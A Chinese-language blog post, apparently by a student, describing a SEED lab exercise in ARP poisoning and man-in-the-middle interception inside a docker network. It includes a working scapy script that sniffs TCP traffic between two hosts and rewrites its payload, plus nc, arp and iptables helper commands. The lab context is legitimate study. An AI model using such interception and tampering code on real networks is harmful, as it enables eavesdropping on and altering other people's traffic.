---
title: "520和安全一同度过"
date: 2024-05-22T14:07:20.000Z
lastmod: 2024-05-23T04:04:31.003Z
draft: false
author: "Tardfyou"
description: "继承与磨练"
summary: "继承与磨练"
slug: "520晚上的攻防浪漫-2024-05-22"
aliases:
  - "/2024/05/22/520晚上的攻防浪漫/"
tags:
  - "learning"
categories:
  - "way of life"
images:
  - "https://seaside-station.com/wpbin/wp-content/uploads/seihama_02.jpg"
lightgallery: true
---

<h1 id="那个晚上">那个晚上</h1><p>谁家好人在这天全天满课啊，没错就是我了。20号的晚上我正式开始了安全综合实践课程，由于本次实验二内容很有趣因此在这里分享一下大致过程。</p>

<!--more-->
<h2 id="内容">内容</h2><p>内网攻防，arp中毒和netcat传输tcp数据包篡改。</p>
<h2 id="环境">环境</h2><p>Ubuntu Seed，网段192.168.60.0/24<br>设备：攻击机HostM：192.168.60.3 eth0，被攻击机HostA：192.168.60.2，eth0，网关HostB：192.168.60.1，docker2。</p>
<h2 id="要求">要求</h2><p>M进行arp中毒和中间人流量转发，A nc连接网关 B，M开启ip转发判断是否实现中间人，然后关闭ip转发，保持中毒状态，运行TCP数据包嗅探篡改和转发脚本，实现将A发往B的数据由123篡改为456。</p>
<h2 id="代码实现">代码实现</h2><h3 id="arp毒化和中间人伪造">arp毒化和中间人伪造</h3><p><img src="/images/poi1.png" /><br><img src="/images/poi2.png" /><br><img src="/images/poi3.png" /></p>
<h3 id="监听脚本-listen-py">监听脚本 listen.py</h3>
<pre><code class="language-plaintext">#!/usr/bin/python

from scapy.all import *

MAC_A = "02:42:c0:a8:3c:02"
MAC_B = "02:42:c9:92:f0:d5"

def spoof_pkt(pkt):
    a = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    b = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    data = bytes(pkt[TCP].payload)  # 将payload转换为字节串
    print("**** %s, length: %d" % (data, len(data)))
    newdata = data.replace(b'123', b'456')  # 使用字节串替换
    newpkt = a/b/newdata

    send(newpkt)

f = 'tcp and (ether src ' + MAC_A + ' or ether src ' + MAC_B + ' )'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)</code></pre>


<h3 id="最终结果">最终结果</h3><p><img src="/images/520result.png" /></p>
<h3 id="其它有关代码">其它有关代码</h3>
<pre><code class="language-plaintext">nc -ln 9090
nc &lt;ip&gt; &lt;port&gt;

docker run &lt;name&gt;
docker start &lt;name&gt;
docker exec -it &lt;name&gt; /bin/bash
docker ps -a
docker cp  &lt;name&gt;:/../..  test.txt
docker cp test.txt &lt;name&gt;:/../..
arp -a
arp -d &lt;ip&gt;
arp -n

sudo -i
Iptables -P FORWARD ACCEPT</code></pre>

<p><img src="https://seaside-station.com/wpbin/wp-content/uploads/nebukawa_28.jpg" alt="life is a long way" /></p>
